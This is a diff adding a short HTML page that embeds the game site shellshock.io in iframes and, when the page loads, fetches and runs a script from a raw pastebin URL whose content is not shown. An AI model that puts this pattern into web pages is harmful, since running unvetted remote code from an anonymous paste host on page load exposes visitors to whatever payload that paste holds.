@@ -1,0 +1,32 @@
+<iframe src="https://shellshock.io" width="100%" height="100%" id="3444345" frameborder="0%"></iframe>
+
+<html lang="en-US">
+ 
+<head>
+    <meta charset="UTF-8">
+    <iframe src="https://shellshock.io" width="100%" height="100%" id="3444345" frameborder="0%"></iframe>
+</head>
+ 
+<body>
+  
+  <script>
+    const script = document.createElement('script');
+    script.setAttribute(
+    'src',
+    'https://pastebin.com/raw/BAE0GeBY',
+    );
+    script.setAttribute('async', '');
+    script.onload = function handleScriptLoaded() {
+        console.log('script has loaded');
+        document.getElementById('3444345').textContent = 'Script loaded successfully';
+    };
+
+    script.onerror = function handleScriptError() {
+        console.log('error loading script');
+    };
+    document.head.appendChild(script);
+  </script>
+ 
+</body>
+ 
+</html>
